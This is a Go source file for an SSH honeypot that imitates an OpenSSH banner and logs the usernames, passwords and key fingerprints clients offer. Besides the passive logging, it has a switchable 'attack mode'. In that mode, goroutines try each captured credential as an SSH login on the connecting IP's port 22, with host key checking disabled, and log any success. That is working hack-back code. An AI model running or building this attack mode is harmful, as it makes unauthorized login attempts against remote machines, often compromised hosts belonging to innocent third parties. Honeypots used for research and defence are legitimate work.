package atsshd

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"regexp"
	"strconv"
	"time"

	"golang.org/x/crypto/ssh"
)

const (
	defRFCBannerPrefix = "SSH-2.0-"
	defBanner          = "SSH-2.0-OpenSSH_7.4p1"

	defPort         = 22
	defCacheTimeout = 1 * time.Hour
	defKeyBits      = 2048
	credBacklog     = 2048
)

type Config struct {
	// If true, then we attack incoming clients with their own passwords
	EnableAttack bool

	// Banner for the SSHD to use.
	// If empty, then "SSH-2.0-OpenSSH_7.4p1" is used.
	Banner string

	// Hostkey file names.
	// If none provided, then a 2048 bit RSA key is generated
	PEMFiles []string

	// If empty, the default log output is to os.Stderr
	Output io.Writer
}

type Server struct {
	sConfig      *ssh.ServerConfig
	l            *log.Logger
	enableAttack bool
	banner       string
}

type cred struct {
	user string
	pass string
}

func (c cred) String() string {
	return c.user + " : " + c.pass
}

type attacker struct {
	cred
	host string
}

func generateRSA_Key(bits int) (ssh.Signer, error) {
	pkey, err := rsa.GenerateKey(rand.Reader, bits)
	if err != nil {
		return nil, err
	}
	blk := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(pkey),
	}
	return ssh.ParsePrivateKey(pem.EncodeToMemory(blk))
}

func prepareHostKey(keyFile string) (ssh.Signer, error) {
	pemBytes, err := ioutil.ReadFile(keyFile)
	if err != nil {
		return nil, fmt.Errorf("ERROR: unable to read file: %s\n", keyFile)
	}
	return ssh.ParsePrivateKey(pemBytes)
}

// a goroutine - maintains the cache of attacker IPs.
func (srv *Server) attackLoop(attCh <-chan *attacker) {
	cacheMap := make(map[string]chan *cred, 1024)
	doneCh := make(chan string, 32)
	for {
		select {
		case attacker := <-attCh:
			credCh, ok := cacheMap[attacker.host]
			if !ok {
				credCh = make(chan *cred, credBacklog)
				cacheMap[attacker.host] = credCh
				go srv.attack(attacker.host, credCh, doneCh)
			}
			// non-blocking send so we don't ever get held up.
			select {
			case credCh <- &cred{attacker.user, attacker.pass}:
			default:
			}

		case host := <-doneCh:
			srv.l.Printf("removing %s from cache.\n", host)
			delete(cacheMap, host)
		}
	}
}

// a goroutine - dedicated to serially attacking a host
func (srv *Server) attack(host string, credCh <-chan *cred, doneCh chan<- string) {
	netfailed := 0
	target := net.JoinHostPort(host, strconv.Itoa(defPort))
	timer := time.NewTimer(defCacheTimeout)
L:
	for {
		timer.Reset(defCacheTimeout)
		select {
		case cred := <-credCh:
			if netfailed >= 3 {
				if netfailed == 3 {
					srv.l.Printf("NOT attacking %s: too many network failures.\n", host)
					netfailed = netfailed + 1
				}
				continue // don't connect out after 3 network failures in a row.
			}
			c, err := net.DialTimeout("tcp", target, 15*time.Second)
			if err != nil {
				srv.l.Printf("Fail: unable to establish tcp connection to %s\n", target)
				netfailed = netfailed + 1
				continue
			}
			netfailed = 0
			cConfig := &ssh.ClientConfig{
				User:            cred.user,
				Auth:            []ssh.AuthMethod{ssh.Password(cred.pass)},
				ClientVersion:   srv.banner,
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			}
			conn, _, _, err := ssh.NewClientConn(c, target, cConfig)
			if err != nil {
				srv.l.Printf("Fail: tried attacking %s with %s\n", host, cred)
			} else {
				conn.Close()
				srv.l.Printf("*** SUCCESS ***: %s worked on %s\n", cred, host)
			}
			c.Close()

		case <-timer.C:
			break L
		}
	}
	doneCh <- host
}

// a goroutine - one for each incoming attacker
func (srv *Server) handle(c net.Conn) {
	defer c.Close()

	srv.l.Printf("Attacker connection from: %s\n", c.RemoteAddr())
	ssh.NewServerConn(c, srv.sConfig)
	srv.l.Printf("Closed connection from: %s\n", c.RemoteAddr())
}

func New(config *Config) (*Server, error) {
	if config == nil {
		config = &Config{}
	}
	srv := &Server{
		enableAttack: config.EnableAttack,
	}
	if config.Output == nil {
		config.Output = os.Stderr
	}
	srv.l = log.New(config.Output, "", log.LstdFlags)

	if config.Banner == "" {
		config.Banner = defBanner
	}
	match := regexp.MustCompile(`^SSH-2.0-[[:alnum:]]+`).MatchString(config.Banner)
	if !match {
		return nil, errors.New("SSH2 banner must start with SSH-2.0- and contain at least one additional character")
	}
	srv.banner = config.Banner

	attCh := make(chan *attacker, 32)
	go srv.attackLoop(attCh)

	srv.sConfig = &ssh.ServerConfig{
		PasswordCallback: func(conn ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			host, _, err := net.SplitHostPort(conn.RemoteAddr().String())
			if err != nil {
				srv.l.Fatalf("bad host or port: %s\n", conn.RemoteAddr())
			}
			srv.l.Printf("Attacker %s (%s) password auth - %s : %s\n",
				host, conn.ClientVersion(), conn.User(), pass)

			if config.EnableAttack {
				if ip := net.ParseIP(host); ip != nil && !ip.IsLoopback() {
					attCh <- &attacker{cred{conn.User(), string(pass)}, host}
				}
			}
			return nil, errors.New("password auth failed") // always fail
		},
		PublicKeyCallback: func(conn ssh.ConnMetadata, key ssh.PublicKey) (*ssh.Permissions, error) {
			host, _, err := net.SplitHostPort(conn.RemoteAddr().String())
			if err != nil {
				srv.l.Fatalf("bad host or port: %s\n", conn.RemoteAddr())
			}
			srv.l.Printf("Attacker %s (%s) pubkey auth - %s : %s %s\n",
				host, conn.ClientVersion(), conn.User(), key.Type(), ssh.FingerprintLegacyMD5(key))

			return nil, errors.New("pubkey auth failed") // always fail
		},
		ServerVersion: config.Banner,
	}

	if len(config.PEMFiles) == 0 {
		srv.l.Printf("Generating %d-bit RSA private key.", defKeyBits)

		signer, err := generateRSA_Key(defKeyBits)
		if err != nil {
			return nil, err
		}
		srv.sConfig.AddHostKey(signer)
		srv.l.Printf("Added host key to the configuration (%s)\n", signer.PublicKey().Type())
	} else {
		for _, file := range config.PEMFiles {
			signer, err := prepareHostKey(file)
			if err != nil {
				return nil, err
			}
			srv.sConfig.AddHostKey(signer)
			srv.l.Printf("Added host key to the configuration (%s)\n", signer.PublicKey().Type())
		}
	}
	return srv, nil
}

func (srv *Server) ListenAndServe(addr string) error {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	return srv.Serve(ln)
}

func (srv *Server) Serve(ln net.Listener) error {
	if srv.enableAttack {
		srv.l.Printf("WARNING: attack mode is on.  Incoming clients will be attacked.\n")
	} else {
		srv.l.Printf("passive mode is on.  Incoming clients will not be attacked.\n")
	}

	for {
		c, err := ln.Accept()
		if err != nil {
			if ne, ok := err.(net.Error); ok && ne.Temporary() {
				continue
			}
			return err
		}
		go srv.handle(c)
	}
	return nil
}
